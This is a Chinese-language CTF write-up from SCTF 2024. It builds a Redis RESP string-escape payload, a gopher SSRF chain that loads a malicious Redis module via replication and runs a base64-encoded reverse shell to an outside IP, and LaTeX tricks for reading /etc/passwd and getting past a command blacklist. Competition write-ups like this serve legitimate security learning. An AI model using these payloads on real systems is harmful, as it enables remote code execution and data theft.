            <span class="token keyword">if</span> response<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span><span class="token string">b'\r\n'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token keyword">break</span>
    <span class="token keyword">finally</span><span class="token punctuation">:</span>
        redis_socket<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> response<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">WAF</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">b'admin'</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span>
        key <span class="token operator">=</span> key<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'admin'</span><span class="token punctuation">,</span> <span class="token string">b'hacker'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> key<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看起来我们可以尝试在<code>add_user</code>的时候写 role 的 key 为admin，那么问题又来到了绕 WAF 方法上</p>
<p>注意到这里是python2，而且在 app.py 中引入了<code>urllib.request</code>，考虑打 CVE-2016-5699</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/success</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">192.168.91.196:8000</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/x-component</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate, br</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://localhost:3000/success</span></span>
<span class="token header"><span class="token header-name keyword">Next-Action</span><span class="token punctuation">:</span> <span class="token header-value">b421a453a66309ec62a2d2049d51250ee55f10fd</span></span>
<span class="token header"><span class="token header-name keyword">Next-Router-State-Tree</span><span class="token punctuation">:</span> <span class="token header-value">%5B%22%22%2C%7B%22children%22%3A%5B%22success%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=---------------------------387260354522125837003053914509</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">336</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://192.168.91.196:8000</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">username-localhost-8888="2|1:0|10:1727599585|23:username-localhost-8888|44:YTg1MjI0NjBlMDQ2NDk3NThlMmM2OWQwYjJlYjI1NTY=|57afc02b8f933c374cd22d26b3e13658dfdf3393f91371e9988085e1fe8c2b0a";session=eyJyb2xlIjoibjBCMGR5IiwidXNlcm5hbWUiOiJndWVzdCJ9.ZvlgKQ.MpEB6rKKlCBg982YcU1UObNrOmI</span></span>
<span class="token header"><span class="token header-name keyword">SSRF</span><span class="token punctuation">:</span> <span class="token header-value">http://172.11.0.3:5000/login?username=http://172.11.0.4%0d%0aset%20user%20Admin%0D%0A:6379&amp;password=123456</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-Dest</span><span class="token punctuation">:</span> <span class="token header-value">empty</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-Mode</span><span class="token punctuation">:</span> <span class="token header-value">cors</span></span>
<span class="token header"><span class="token header-name keyword">Sec-Fetch-Site</span><span class="token punctuation">:</span> <span class="token header-value">same-origin</span></span>

-----------------------------387260354522125837003053914509
<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="1_$ACTION_ID_b421a453a66309ec62a2d2049d51250ee55f10fd"</span></span>


-----------------------------387260354522125837003053914509
<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="0"</span></span>

["$K1"]
-----------------------------387260354522125837003053914509--
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然而并没有成功</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20240930001637889.png" alt="image-20240930001637889"></p>
<p>没时间研究了。。</p>
<p><br>回到waf上来</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'file://'</span><span class="token punctuation">,</span> <span class="token string">'gopher://'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>gopher://</code> 可以大小写绕</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">WAF</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">b'admin'</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span>
        key <span class="token operator">=</span> key<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b'admin'</span><span class="token punctuation">,</span> <span class="token string">b'hacker'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> key<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>替换字符串导致长度+1的操作，有点眼熟，猜测有字符串逃逸</p>
<p>再看看这里RESP请求的构造</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">pack_command</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 构建 RESP 请求</span>
    command <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"*</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\r\n"</span></span>
    <span class="token keyword">for</span> arg <span class="token keyword">in</span> args<span class="token punctuation">:</span>
        arg_str <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span>
        command <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"$</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>arg_str<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\r\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>arg_str<span class="token punctuation">&#125;</span></span><span class="token string">\r\n"</span></span>
    <span class="token keyword">return</span> command<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这里如果长度不一样的话就是字符串逃逸了，然后注入新的指令执行</p>
<p>测试：</p>
<p>先打印出正常的SET的command看看：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> json
<span class="token keyword">import</span> base64

<span class="token keyword">def</span> <span class="token function">pack_command</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 构建 RESP 请求</span>
    command <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"*</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\r\n"</span></span>
    <span class="token keyword">for</span> arg <span class="token keyword">in</span> args<span class="token punctuation">:</span>
        arg_str <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span>
        command <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"$</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>arg_str<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\r\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>arg_str<span class="token punctuation">&#125;</span></span><span class="token string">\r\n"</span></span>
    <span class="token keyword">return</span> command<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">SET</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">:</span>
    command <span class="token operator">=</span> pack_command<span class="token punctuation">(</span><span class="token string">"SET"</span><span class="token punctuation">,</span> key<span class="token punctuation">,</span> value<span class="token punctuation">)</span>
    command <span class="token operator">=</span> WAF<span class="token punctuation">(</span>command<span class="token punctuation">)</span>
    <span class="token keyword">return</span> command

<span class="token keyword">def</span> <span class="token function">WAF</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token string">b"admin"</span> <span class="token keyword">in</span> key<span class="token punctuation">:</span>
        key <span class="token operator">=</span> key<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b"admin"</span><span class="token punctuation">,</span> <span class="token string">b"hacker"</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> key

user_info <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token string">"role"</span><span class="token punctuation">:</span> <span class="token string">"admin"</span><span class="token punctuation">&#125;</span>
user_info_json <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>user_info<span class="token punctuation">)</span>
user_info_serialized <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>user_info_json<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>SET<span class="token punctuation">(</span><span class="token string">"user:test"</span><span class="token punctuation">,</span>user_info_serialized<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>得到：<code>*3\r\n$3\r\nSET\r\n$9\r\nuser:test\r\n$48\r\neyJwYXNzd29yZCI6IG51bGwsICJyb2xlIjogImFkbWluIn0=\r\n</code></p>
<p>格式就像下面这样，每一个字段之间用<code>\r\n</code>间隔：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">*</span><span class="token number">3</span>
$<span class="token number">3</span>
<span class="token keyword">SET</span>
$x
<span class="token keyword">user</span>:xxxx
$x
base64_encoded_json_password_and_role<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>由于 password 会被base64处理，所以我们可控的只有 username，那么我们就要截断<code>*3\r\n$3\r\nSET\r\n$9\r\nuser:test\r\n</code>这部分，然后注入我们自己的语句，这里先以插入一个权限为admin的新user作为测试</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">*</span><span class="token number">3</span>\r\n$<span class="token number">3</span>\r\nSET\r\n$<span class="token number">9</span>\r\nuser:test\r\n$<span class="token number">0</span>\r\n\r\n
<span class="token operator">*</span><span class="token number">3</span>\r\n$<span class="token number">3</span>\r\nSET\r\n$<span class="token number">6</span>\r\nuser:a\r\n$<span class="token number">48</span>\r\neyJwYXNzd29yZCI6IG51bGwsICJyb2xlIjogImFkbWluIn0<span class="token operator">=</span>\r\n<span class="token comment">//</span>
<span class="token punctuation">(</span>最后要注释掉后面的部分<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>那么我们要逃逸出<code>\r\n$0\r\n\r\n&quot;+&quot;*3\r\n$3\r\nSET\r\n$6\r\nuser:a\r\n$48\r\neyJwYXNzd29yZCI6IG51bGwsICJyb2xlIjogImFkbWluIn0=//</code>共88位字符</p>
<p>于是构造一下得到payload：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># print(SET("user:"+"admin"*88+"\r\n$0\r\n\r\n"+"*3\r\n$3\r\nSET\r\n$6\r\nuser:a\r\n$48\r\neyJwYXNzd29yZCI6IG51bGwsICJyb2xlIjogImFkbWluIn0=//",""))</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"admin"</span><span class="token operator">*</span><span class="token number">88</span><span class="token operator">+</span><span class="token string">"%0D%0A$0%0D%0A%0D%0A"</span><span class="token operator">+</span><span class="token string">"*3%0D%0A$3%0D%0ASET%0D%0A$6%0D%0Auser:a%0D%0A$48%0D%0AeyJwYXNzd29yZCI6IG51bGwsICJyb2xlIjogImFkbWluIn0=//"</span><span class="token punctuation">)</span>


<span class="token comment"># adminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadminadmin%0D%0A$0%0D%0A%0D%0A*3%0D%0A$3%0D%0ASET%0D%0A$6%0D%0Auser:a%0D%0A$48%0D%0AeyJwYXNzd29yZCI6IG51bGwsICJyb2xlIjogImFkbWluIn0=//</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>本地测试一下</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20241003011105381.png" alt="image-20241003011105381"></p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20241003011119534.png" alt="image-20241003011119534"></p>
<p>成功写入用户a，密码为空</p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20241003011214051.png" alt="image-20241003011214051"></p>
<p>并且是admin权限</p>
<p>接下来观察命令执行的代码</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">cmd<span class="token operator">=</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"cmd"</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token keyword">not</span> cmd<span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">"No command provided"</span><span class="token punctuation">,</span> <span class="token number">400</span>
<span class="token keyword">if</span> waf<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">"nonono"</span>
<span class="token keyword">try</span><span class="token punctuation">:</span>
    result <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'curl'</span><span class="token punctuation">,</span> cmd<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> result<span class="token punctuation">.</span>stdout
<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"Error: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">,</span> <span class="token number">500</span>

<span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'file://'</span><span class="token punctuation">,</span> <span class="token string">'gopher://'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接下来就是 ssrf 部分了，gopher打主从复制来弹shell</p>
<p>这里得手动打，因为我们不能掉登录，得设置<code> slave-read-only</code>：</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">config <span class="token keyword">set</span> slave<span class="token operator">-</span><span class="token keyword">read</span><span class="token operator">-</span>only <span class="token keyword">no</span>
SLAVEOF <span class="token number">192.168</span><span class="token number">.0</span><span class="token number">.142</span> <span class="token number">21000</span>
<span class="token comment"># 连上之后需要重新登录</span>
CONFIG <span class="token keyword">SET</span> dir <span class="token operator">/</span>tmp<span class="token operator">/</span>
CONFIG <span class="token keyword">SET</span> dbfilename exp<span class="token punctuation">.</span>so
slaveof <span class="token keyword">no</span> one
MODULE <span class="token keyword">LOAD</span> <span class="token operator">/</span>tmp<span class="token operator">/</span>exp<span class="token punctuation">.</span>so
system<span class="token punctuation">.</span><span class="token keyword">exec</span> <span class="token string">'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTQyLzY2NiAwPiYx | base64 -d | bash'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>生成payload，url编码两次后打进去：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> quote


<span class="token keyword">def</span> <span class="token function">pack_command</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 构建 RESP 请求</span>
    command <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"*</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\r\n"</span></span>
    <span class="token keyword">for</span> arg <span class="token keyword">in</span> args<span class="token punctuation">:</span>
        arg_str <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>arg<span class="token punctuation">)</span>
        command <span class="token operator">+=</span> <span class="token string-interpolation"><span class="token string">f"$</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>arg_str<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\r\n</span><span class="token interpolation"><span class="token punctuation">&#123;</span>arg_str<span class="token punctuation">&#125;</span></span><span class="token string">\r\n"</span></span>
    <span class="token keyword">return</span> command<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>quote<span class="token punctuation">(</span>quote<span class="token punctuation">(</span>pack_command<span class="token punctuation">(</span><span class="token string">"SET"</span><span class="token punctuation">,</span><span class="token string">"user:ddd"</span><span class="token punctuation">,</span><span class="token string">"xxx"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>quote<span class="token punctuation">(</span>quote<span class="token punctuation">(</span>pack_command<span class="token punctuation">(</span><span class="token string">"config"</span><span class="token punctuation">,</span><span class="token string">"set"</span><span class="token punctuation">,</span><span class="token string">"slave-read-only"</span><span class="token punctuation">,</span><span class="token string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>quote<span class="token punctuation">(</span>quote<span class="token punctuation">(</span>pack_command<span class="token punctuation">(</span><span class="token string">"SLAVEOF"</span><span class="token punctuation">,</span><span class="token string">"192.168.0.142"</span><span class="token punctuation">,</span><span class="token string">"21000"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>quote<span class="token punctuation">(</span>quote<span class="token punctuation">(</span>pack_command<span class="token punctuation">(</span><span class="token string">"SLAVEOF"</span><span class="token punctuation">,</span><span class="token string">"no one"</span><span class="token punctuation">,</span><span class="token string">"one"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>quote<span class="token punctuation">(</span>quote<span class="token punctuation">(</span>pack_command<span class="token punctuation">(</span><span class="token string">"CONFIG"</span><span class="token punctuation">,</span><span class="token string">"SET"</span><span class="token punctuation">,</span><span class="token string">"dir"</span><span class="token punctuation">,</span><span class="token string">"/tmp/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>quote<span class="token punctuation">(</span>quote<span class="token punctuation">(</span>pack_command<span class="token punctuation">(</span><span class="token string">"CONFIG"</span><span class="token punctuation">,</span><span class="token string">"SET"</span><span class="token punctuation">,</span><span class="token string">"dbfilename"</span><span class="token punctuation">,</span><span class="token string">"exp.so"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>quote<span class="token punctuation">(</span>quote<span class="token punctuation">(</span>pack_command<span class="token punctuation">(</span><span class="token string">"MODULE"</span><span class="token punctuation">,</span><span class="token string">"LOAD"</span><span class="token punctuation">,</span><span class="token string">"/tmp/exp.so"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>quote<span class="token punctuation">(</span>quote<span class="token punctuation">(</span>pack_command<span class="token punctuation">(</span><span class="token string">"system.exec"</span><span class="token punctuation">,</span><span class="token string">"echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTQyLzY2NiAwPiYx | base64 -d | bash"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/09/28/SCTF-2024/image-20241003031257486.png" alt="image-20241003031257486"></p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20241003031442349.png" alt="image-20241003031442349"></p>
<p><img src="/blog/2024/09/28/SCTF-2024/image-20241003023609639.png" alt="image-20241003023609639"></p>
<hr>
<h1 id="ez-tex（复现）"><a href="#ez-tex（复现）" class="headerlink" title="ez_tex（复现）"></a>ez_tex（复现）</h1><blockquote>
<p>hint: &#x2F;log</p>
</blockquote>
<p>Werkzeug&#x2F;2.1.2 Python&#x2F;3.7.17</p>
<p>就一个上传和编译 tex 文件的python web服务</p>
<p>compile后不回显内容，也不知道文件传到哪去了</p>
<p>&#x2F;log 那里给了个app.log，看不懂</p>
<p>先看一下tex的注入吧，参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/security-management/308191.html">https://www.freebuf.com/articles/security-management/308191.html</a></p>
<p>tex的格式大致如下：</p>
<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\documentclass</span><span class="token punctuation">&#123;</span><span class="token keyword">article</span><span class="token punctuation">&#125;</span>
<span class="token function selector">\begin</span><span class="token punctuation">&#123;</span><span class="token keyword">document</span><span class="token punctuation">&#125;</span>
<span class="token comment">% Your content here</span>
<span class="token function selector">\end</span><span class="token punctuation">&#123;</span><span class="token keyword">document</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>测了一下，tex的内容ban了下面这些东西</p>
<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\write</span>18
<span class="token function selector">\immediate</span>
<span class="token function selector">\input</span>
app
/
<span class="token function selector">\include</span>
..<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后编译允许的编译文件名长度最长为6</p>
<p>读文件</p>
<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\newread</span><span class="token function selector">\file</span>
<span class="token function selector">\openin</span><span class="token function selector">\file</span>=<span class="token function selector">\\</span>etc<span class="token function selector">\\</span>passwd
<span class="token function selector">\read</span><span class="token function selector">\file</span> to<span class="token function selector">\line</span>
<span class="token function selector">\text</span><span class="token punctuation">&#123;</span><span class="token function selector">\line</span><span class="token punctuation">&#125;</span>
<span class="token function selector">\closein</span><span class="token function selector">\file</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>写文件，但是不确定在哪里可以触发</p>
<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\newwrite</span><span class="token function selector">\outfile</span>
<span class="token function selector">\openout</span><span class="token function selector">\outfile</span>=testfile
<span class="token function selector">\write</span><span class="token function selector">\outfile</span><span class="token punctuation">&#123;</span>safe6<span class="token punctuation">&#125;</span>
<span class="token function selector">\closeout</span><span class="token function selector">\outfile</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>bypass的方式，类似php免杀了：</p>
<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\def</span> <span class="token function selector">\imm</span> <span class="token punctuation">&#123;</span><span class="token function selector">\string</span><span class="token function selector">\imme</span><span class="token punctuation">&#125;</span>
<span class="token function selector">\def</span> <span class="token function selector">\diate</span> <span class="token punctuation">&#123;</span>diate<span class="token punctuation">&#125;</span>
<span class="token function selector">\def</span> <span class="token function selector">\wwrite</span> <span class="token punctuation">&#123;</span>wwrite<span class="token punctuation">&#125;</span>
<span class="token function selector">\def</span> <span class="token function selector">\args</span> <span class="token punctuation">&#123;</span>args<span class="token punctuation">&#125;</span>

<span class="token function selector">\newwrite</span><span class="token function selector">\outfile</span>
<span class="token function selector">\openout</span><span class="token function selector">\outfile</span>=cmd.tex
<span class="token function selector">\write</span><span class="token function selector">\outfile</span><span class="token punctuation">&#123;</span><span class="token function selector">\imm</span><span class="token function selector">\diate</span><span class="token function selector">\wwrite</span><span class="token function selector">\args</span><span class="token punctuation">&#125;</span>
<span class="token function selector">\write</span><span class="token function selector">\outfile</span><span class="token punctuation">&#123;</span><span class="token function selector">\inp</span><span class="token function selector">\iput</span><span class="token function selector">\cmd</span><span class="token punctuation">&#125;</span>
<span class="token function selector">\closeout</span><span class="token function selector">\outfile</span>

<span class="token function selector">\newread</span><span class="token function selector">\file</span>
<span class="token function selector">\openin</span><span class="token function selector">\file</span>=cmd.tex
<span class="token function selector">\loop</span><span class="token function selector">\unless</span><span class="token function selector">\ifeof</span><span class="token function selector">\file</span>
<span class="token function selector">\read</span><span class="token function selector">\file</span> to<span class="token function selector">\fileline</span>
<span class="token function selector">\fileline</span>
<span class="token function selector">\repeat</span>
